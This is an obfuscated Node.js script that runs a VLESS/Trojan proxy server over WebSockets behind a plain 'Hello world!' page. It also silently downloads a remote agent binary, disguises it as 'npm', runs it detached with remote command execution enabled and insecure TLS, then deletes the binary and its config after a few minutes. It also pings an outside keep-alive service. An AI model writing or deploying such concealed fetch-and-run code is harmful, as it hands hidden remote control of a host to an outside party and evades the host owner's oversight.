function _0x12eb(_0xd4139,_0x5dc402){_0xd4139=_0xd4139-0x120;const _0x4fdf67=_0x4fdf();let _0x12ebe9=_0x4fdf67[_0xd4139];return _0x12ebe9;}const _0x2fe184=_0x12eb;(function(_0x50247f,_0x251284){const _0x558172=_0x12eb,_0x3f3f08=_0x50247f();while(!![]){try{const _0x27721d=-parseInt(_0x558172(0x123))/0x1*(parseInt(_0x558172(0x18d))/0x2)+parseInt(_0x558172(0x17f))/0x3+-parseInt(_0x558172(0x124))/0x4*(-parseInt(_0x558172(0x169))/0x5)+parseInt(_0x558172(0x140))/0x6+-parseInt(_0x558172(0x190))/0x7*(parseInt(_0x558172(0x13f))/0x8)+-parseInt(_0x558172(0x183))/0x9*(-parseInt(_0x558172(0x186))/0xa)+-parseInt(_0x558172(0x158))/0xb;if(_0x27721d===_0x251284)break;else _0x3f3f08['push'](_0x3f3f08['shift']());}catch(_0x1b1ec4){_0x3f3f08['push'](_0x3f3f08['shift']());}}}(_0x4fdf,0xf26cb));const os=require('os'),http=require(_0x2fe184(0x172)),fs=require('fs'),axios=require('axios'),net=require(_0x2fe184(0x170)),path=require(_0x2fe184(0x147)),crypto=require(_0x2fe184(0x17c)),{Buffer}=require(_0x2fe184(0x176)),{exec,execSync}=require(_0x2fe184(0x175)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2fe184(0x13a)][_0x2fe184(0x177)]||_0x2fe184(0x12d),NEZHA_SERVER=process[_0x2fe184(0x13a)][_0x2fe184(0x155)]||'',NEZHA_PORT=process['env'][_0x2fe184(0x126)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x2fe184(0x13a)]['DOMAIN']||_0x2fe184(0x14c),AUTO_ACCESS=process[_0x2fe184(0x13a)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x2fe184(0x163)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x2fe184(0x13a)]['SUB_PATH']||_0x2fe184(0x17b),NAME=process[_0x2fe184(0x13a)][_0x2fe184(0x14e)]||_0x2fe184(0x120),PORT=process['env'][_0x2fe184(0x14a)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2233f5=_0x2fe184;try{const _0x18a030=await axios[_0x2233f5(0x12b)]('https://speed.cloudflare.com/meta'),_0x31710b=_0x18a030['data'];ISP=(_0x31710b[_0x2233f5(0x164)]+'-'+_0x31710b[_0x2233f5(0x142)])[_0x2233f5(0x134)](/ /g,'_');}catch(_0x1f40a1){ISP=_0x2233f5(0x18c);}};GetISP();const httpServer=http[_0x2fe184(0x133)]((_0x3fe704,_0x4775e2)=>{const _0x11213b=_0x2fe184;if(_0x3fe704[_0x11213b(0x15d)]==='/'){const _0x430a0a=path[_0x11213b(0x127)](__dirname,_0x11213b(0x178));fs[_0x11213b(0x150)](_0x430a0a,_0x11213b(0x139),(_0x3554ac,_0x1cd980)=>{const _0x45eafb=_0x11213b;if(_0x3554ac){_0x4775e2[_0x45eafb(0x171)](0xc8,{'Content-Type':_0x45eafb(0x129)}),_0x4775e2['end'](_0x45eafb(0x18e));return;}_0x4775e2[_0x45eafb(0x171)](0xc8,{'Content-Type':'text/html'}),_0x4775e2['end'](_0x1cd980);});return;}else{if(_0x3fe704[_0x11213b(0x15d)]==='/'+SUB_PATH){const _0x224496=_0x11213b(0x184)+UUID+'@'+DOMAIN+_0x11213b(0x153)+DOMAIN+_0x11213b(0x132)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x174c7c='trojan://'+UUID+'@'+DOMAIN+_0x11213b(0x136)+DOMAIN+_0x11213b(0x132)+DOMAIN+_0x11213b(0x16e)+WSPATH+'#'+NAME+'-'+ISP,_0x2d0976=_0x224496+'\x0a'+_0x174c7c,_0x2c16c0=Buffer[_0x11213b(0x191)](_0x2d0976)[_0x11213b(0x198)](_0x11213b(0x18f));_0x4775e2[_0x11213b(0x171)](0xc8,{'Content-Type':_0x11213b(0x160)}),_0x4775e2[_0x11213b(0x197)](_0x2c16c0+'\x0a');}else _0x4775e2['writeHead'](0x194,{'Content-Type':_0x11213b(0x160)}),_0x4775e2[_0x11213b(0x197)](_0x11213b(0x165));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x2fe184(0x134)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x11cf37){return new Promise((_0x36a327,_0x3a8f76)=>{const _0x26b141=_0x12eb;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x26b141(0x162)](_0x11cf37)){_0x36a327(_0x11cf37);return;}let _0x524c5c=0x0;function _0x24a0a6(){const _0x2e2667=_0x26b141;if(_0x524c5c>=DNS_SERVERS[_0x2e2667(0x14d)]){_0x3a8f76(new Error(_0x2e2667(0x130)+_0x11cf37+_0x2e2667(0x192)));return;}const _0x80faac=DNS_SERVERS[_0x524c5c];_0x524c5c++;const _0xbe7633=_0x2e2667(0x15e)+encodeURIComponent(_0x11cf37)+'&type=A';axios['get'](_0xbe7633,{'timeout':0x1388,'headers':{'Accept':_0x2e2667(0x195)}})[_0x2e2667(0x16a)](_0x389055=>{const _0x26c158=_0x2e2667,_0x45b023=_0x389055['data'];if(_0x45b023[_0x26c158(0x167)]===0x0&&_0x45b023['Answer']&&_0x45b023[_0x26c158(0x196)][_0x26c158(0x14d)]>0x0){const _0x5af27a=_0x45b023[_0x26c158(0x196)]['find'](_0x567840=>_0x567840['type']===0x1);if(_0x5af27a){_0x36a327(_0x5af27a[_0x26c158(0x13d)]);return;}}_0x24a0a6();})[_0x2e2667(0x181)](_0x5a57ea=>{_0x24a0a6();});}_0x24a0a6();});}function handleVlessConnection(_0x3e6208,_0x4d2d21){const _0x3033a4=_0x2fe184,[_0x3d9e50]=_0x4d2d21,_0x49c19a=_0x4d2d21[_0x3033a4(0x18b)](0x1,0x11);if(!_0x49c19a[_0x3033a4(0x187)]((_0x704e32,_0x470153)=>_0x704e32==parseInt(uuid[_0x3033a4(0x151)](_0x470153*0x2,0x2),0x10)))return![];let _0xd2d783=_0x4d2d21[_0x3033a4(0x18b)](0x11,0x12)['readUInt8']()+0x13;const _0x4b1eeb=_0x4d2d21[_0x3033a4(0x18b)](_0xd2d783,_0xd2d783+=0x2)['readUInt16BE'](0x0),_0x5821c3=_0x4d2d21[_0x3033a4(0x18b)](_0xd2d783,_0xd2d783+=0x1)['readUInt8'](),_0x59e8a1=_0x5821c3==0x1?_0x4d2d21[_0x3033a4(0x18b)](_0xd2d783,_0xd2d783+=0x4)[_0x3033a4(0x127)]('.'):_0x5821c3==0x2?new TextDecoder()[_0x3033a4(0x128)](_0x4d2d21[_0x3033a4(0x18b)](_0xd2d783+0x1,_0xd2d783+=0x1+_0x4d2d21[_0x3033a4(0x18b)](_0xd2d783,_0xd2d783+0x1)['readUInt8']())):_0x5821c3==0x3?_0x4d2d21[_0x3033a4(0x18b)](_0xd2d783,_0xd2d783+=0x10)[_0x3033a4(0x121)]((_0x512691,_0x5f1bac,_0x37eb67,_0xa8f9c3)=>_0x37eb67%0x2?_0x512691['concat'](_0xa8f9c3[_0x3033a4(0x18b)](_0x37eb67-0x1,_0x37eb67+0x1)):_0x512691,[])['map'](_0x56e4dc=>_0x56e4dc['readUInt16BE'](0x0)[_0x3033a4(0x198)](0x10))[_0x3033a4(0x127)](':'):'';_0x3e6208[_0x3033a4(0x12a)](new Uint8Array([_0x3d9e50,0x0]));const _0x33407b=createWebSocketStream(_0x3e6208);return resolveHost(_0x59e8a1)['then'](_0xfff68b=>{const _0x4d9ef8=_0x3033a4;net['connect']({'host':_0xfff68b,'port':_0x4b1eeb},function(){const _0x2e4d0c=_0x12eb;this[_0x2e4d0c(0x13c)](_0x4d2d21[_0x2e4d0c(0x18b)](_0xd2d783)),_0x33407b['on'](_0x2e4d0c(0x149),()=>{})[_0x2e4d0c(0x15c)](this)['on'](_0x2e4d0c(0x149),()=>{})[_0x2e4d0c(0x15c)](_0x33407b);})['on'](_0x4d9ef8(0x149),()=>{});})[_0x3033a4(0x181)](_0x19e1db=>{const _0x2abb47=_0x3033a4;net[_0x2abb47(0x156)]({'host':_0x59e8a1,'port':_0x4b1eeb},function(){const _0x202b54=_0x2abb47;this['write'](_0x4d2d21[_0x202b54(0x18b)](_0xd2d783)),_0x33407b['on'](_0x202b54(0x149),()=>{})[_0x202b54(0x15c)](this)['on'](_0x202b54(0x149),()=>{})[_0x202b54(0x15c)](_0x33407b);})['on'](_0x2abb47(0x149),()=>{});}),!![];}function handleTrojanConnection(_0x377008,_0x4999d8){const _0x3a56d4=_0x2fe184;try{if(_0x4999d8[_0x3a56d4(0x14d)]<0x3a)return![];const _0x23fd70=_0x4999d8['slice'](0x0,0x38)[_0x3a56d4(0x198)](),_0x24f172=[UUID];let _0x5b143f=null;for(const _0x51a377 of _0x24f172){const _0x307493=crypto[_0x3a56d4(0x13e)](_0x3a56d4(0x173))[_0x3a56d4(0x16b)](_0x51a377)[_0x3a56d4(0x152)](_0x3a56d4(0x18a));if(_0x307493===_0x23fd70){_0x5b143f=_0x51a377;break;}}if(!_0x5b143f)return![];let _0xec8f42=0x38;_0x4999d8[_0xec8f42]===0xd&&_0x4999d8[_0xec8f42+0x1]===0xa&&(_0xec8f42+=0x2);const _0x566663=_0x4999d8[_0xec8f42];if(_0x566663!==0x1)return![];_0xec8f42+=0x1;const _0x1f1296=_0x4999d8[_0xec8f42];_0xec8f42+=0x1;let _0x34b8b1,_0x15e781;if(_0x1f1296===0x1)_0x34b8b1=_0x4999d8[_0x3a56d4(0x18b)](_0xec8f42,_0xec8f42+0x4)[_0x3a56d4(0x127)]('.'),_0xec8f42+=0x4;else{if(_0x1f1296===0x3){const _0x427f15=_0x4999d8[_0xec8f42];_0xec8f42+=0x1,_0x34b8b1=_0x4999d8[_0x3a56d4(0x18b)](_0xec8f42,_0xec8f42+_0x427f15)[_0x3a56d4(0x198)](),_0xec8f42+=_0x427f15;}else{if(_0x1f1296===0x4)_0x34b8b1=_0x4999d8[_0x3a56d4(0x18b)](_0xec8f42,_0xec8f42+0x10)[_0x3a56d4(0x121)]((_0x1c5f04,_0x433350,_0x1080a0,_0x1ccca7)=>_0x1080a0%0x2?_0x1c5f04[_0x3a56d4(0x16d)](_0x1ccca7[_0x3a56d4(0x18b)](_0x1080a0-0x1,_0x1080a0+0x1)):_0x1c5f04,[])['map'](_0x474f8d=>_0x474f8d['readUInt16BE'](0x0)[_0x3a56d4(0x198)](0x10))[_0x3a56d4(0x127)](':'),_0xec8f42+=0x10;else return![];}}_0x15e781=_0x4999d8['readUInt16BE'](_0xec8f42),_0xec8f42+=0x2;_0xec8f42<_0x4999d8['length']&&_0x4999d8[_0xec8f42]===0xd&&_0x4999d8[_0xec8f42+0x1]===0xa&&(_0xec8f42+=0x2);const _0x7edaf4=createWebSocketStream(_0x377008);return resolveHost(_0x34b8b1)[_0x3a56d4(0x16a)](_0x48d06c=>{const _0x3776b6=_0x3a56d4;net[_0x3776b6(0x156)]({'host':_0x48d06c,'port':_0x15e781},function(){const _0x34a2be=_0x3776b6;_0xec8f42<_0x4999d8['length']&&this[_0x34a2be(0x13c)](_0x4999d8['slice'](_0xec8f42)),_0x7edaf4['on']('error',()=>{})['pipe'](this)['on'](_0x34a2be(0x149),()=>{})[_0x34a2be(0x15c)](_0x7edaf4);})['on'](_0x3776b6(0x149),()=>{});})[_0x3a56d4(0x181)](_0x2d1295=>{const _0x44db9b=_0x3a56d4;net[_0x44db9b(0x156)]({'host':_0x34b8b1,'port':_0x15e781},function(){const _0x291ea5=_0x44db9b;_0xec8f42<_0x4999d8[_0x291ea5(0x14d)]&&this[_0x291ea5(0x13c)](_0x4999d8[_0x291ea5(0x18b)](_0xec8f42)),_0x7edaf4['on'](_0x291ea5(0x149),()=>{})[_0x291ea5(0x15c)](this)['on'](_0x291ea5(0x149),()=>{})[_0x291ea5(0x15c)](_0x7edaf4);})['on'](_0x44db9b(0x149),()=>{});}),!![];}catch(_0x43ab83){return![];}}wss['on'](_0x2fe184(0x17d),(_0x17acac,_0x144667)=>{const _0x4c379b=_0x2fe184,_0x26ee30=_0x144667['url']||'';_0x17acac['once'](_0x4c379b(0x15a),_0x4ae3b1=>{const _0x2dc588=_0x4c379b;if(_0x4ae3b1['length']>0x11&&_0x4ae3b1[0x0]===0x0){const _0x175e0e=_0x4ae3b1[_0x2dc588(0x18b)](0x1,0x11),_0x54b3fc=_0x175e0e['every']((_0x4647d5,_0x424ee8)=>_0x4647d5==parseInt(uuid['substr'](_0x424ee8*0x2,0x2),0x10));if(_0x54b3fc){!handleVlessConnection(_0x17acac,_0x4ae3b1)&&_0x17acac['close']();return;}}!handleTrojanConnection(_0x17acac,_0x4ae3b1)&&_0x17acac[_0x2dc588(0x168)]();})['on'](_0x4c379b(0x149),()=>{});});const getDownloadUrl=()=>{const _0x156f6c=_0x2fe184,_0x1c7d65=os[_0x156f6c(0x146)]();return _0x1c7d65===_0x156f6c(0x137)||_0x1c7d65===_0x156f6c(0x144)||_0x1c7d65===_0x156f6c(0x12f)?!NEZHA_PORT?_0x156f6c(0x145):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x156f6c(0x12e):_0x156f6c(0x193);},downloadFile=async()=>{const _0x101d6c=_0x2fe184;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4ca13d=getDownloadUrl(),_0x324ec1=await axios({'method':'get','url':_0x4ca13d,'responseType':_0x101d6c(0x141)}),_0x3d0e3a=fs[_0x101d6c(0x135)](_0x101d6c(0x148));return _0x324ec1[_0x101d6c(0x13d)][_0x101d6c(0x15c)](_0x3d0e3a),new Promise((_0x1f7c6b,_0xfcb327)=>{const _0x20d196=_0x101d6c;_0x3d0e3a['on'](_0x20d196(0x17e),()=>{const _0x1958e6=_0x20d196;console[_0x1958e6(0x159)]('npm\x20download\x20successfully'),exec(_0x1958e6(0x15f),_0x5910d7=>{if(_0x5910d7)_0xfcb327(_0x5910d7);_0x1f7c6b();});}),_0x3d0e3a['on'](_0x20d196(0x149),_0xfcb327);});}catch(_0x2d27bf){throw _0x2d27bf;}},runnz=async()=>{const _0x562c6a=_0x2fe184;try{const _0x1311d7=execSync(_0x562c6a(0x194),{'encoding':_0x562c6a(0x180)});if(_0x1311d7[_0x562c6a(0x189)]()!==''){console[_0x562c6a(0x159)](_0x562c6a(0x14b));return;}}catch(_0x9898fd){}await downloadFile();let _0x1447f4='',_0x365dc3=[_0x562c6a(0x174),_0x562c6a(0x138),'2096',_0x562c6a(0x16c),'2083',_0x562c6a(0x131)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x13a346=_0x365dc3[_0x562c6a(0x179)](NEZHA_PORT)?'--tls':'';_0x1447f4='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x562c6a(0x12c)+NEZHA_KEY+'\x20'+_0x13a346+_0x562c6a(0x16f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3d314e=NEZHA_SERVER[_0x562c6a(0x179)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x4bc0f=_0x365dc3[_0x562c6a(0x179)](_0x3d314e)?_0x562c6a(0x13b):_0x562c6a(0x154),_0x2ae1b2=_0x562c6a(0x182)+NEZHA_KEY+_0x562c6a(0x14f)+NEZHA_SERVER+_0x562c6a(0x166)+_0x4bc0f+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x562c6a(0x122),_0x2ae1b2);}_0x1447f4='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x562c6a(0x159)](_0x562c6a(0x188));return;}}try{exec(_0x1447f4,{'shell':_0x562c6a(0x161)},_0x35ca9a=>{const _0xebd344=_0x562c6a;if(_0x35ca9a)console[_0xebd344(0x149)]('npm\x20running\x20error:',_0x35ca9a);else console[_0xebd344(0x159)](_0xebd344(0x157));});}catch(_0xba3b84){console[_0x562c6a(0x149)]('error:\x20'+_0xba3b84);}};async function addAccessTask(){const _0x1b57b2=_0x2fe184;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x47867b='https://'+DOMAIN;try{const _0x3040be=await axios[_0x1b57b2(0x143)](_0x1b57b2(0x17a),{'url':_0x47867b},{'headers':{'Content-Type':_0x1b57b2(0x125)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x353988){}}const delFiles=()=>{const _0x56d5e3=_0x2fe184;fs[_0x56d5e3(0x15b)](_0x56d5e3(0x148),()=>{}),fs[_0x56d5e3(0x15b)]('config.yaml',()=>{});};function _0x4fdf(){const _0x1e70f8=['application/json','NEZHA_PORT','join','decode','text/html','send','get','\x20-p\x20','5efabea4-f6d4-91fd-b8f0-17f004c89c60','https://amd64.ssss.nyc.mn/v1','aarch64','Failed\x20to\x20resolve\x20','2053','&fp=chrome&type=ws&host=','createServer','replace','createWriteStream',':443?security=tls&sni=','arm','8443','utf8','env','true','write','data','createHash','47688YTytrP','4344444CDYvZG','stream','asOrganization','post','arm64','https://arm64.ssss.nyc.mn/v1','arch','path','npm','error','PORT','npm\x20is\x20already\x20running,\x20skip\x20running...','node.1vantasight.app','length','NAME','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','readFile','substr','digest',':443?encryption=none&security=tls&sni=','false','NEZHA_SERVER','connect','npm\x20is\x20running','30745319zavuxa','log','message','unlink','pipe','url','https://dns.google/resolve?name=','chmod\x20+x\x20npm','text/plain','/bin/bash','test','WSPATH','country','Not\x20Found\x0a','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Status','close','3917855rRIoCT','then','update','2087','concat','&path=%2F','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','net','writeHead','http','sha224','443','child_process','buffer','UUID','index.html','includes','https://oooo.serv00.net/add-url','sub','crypto','connection','finish','3305871QYFKIZ','utf-8','catch','client_secret:\x20','9ftYhgl','vless://','Server\x20is\x20running\x20on\x20port\x20','19305010BcreID','every','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','trim','hex','slice','Unknown','1214IKfvNP','Hello\x20world!','base64','665AqHVMB','from','\x20with\x20all\x20DNS\x20servers','https://amd64.ssss.nyc.mn/agent','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','application/dns-json','Answer','end','toString','Ziv','reduce','config.yaml','1597ZDXIRa','8XaNrUw'];_0x4fdf=function(){return _0x1e70f8;};return _0x4fdf();}httpServer['listen'](PORT,()=>{const _0x450bff=_0x2fe184;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x450bff(0x159)](_0x450bff(0x185)+PORT);});
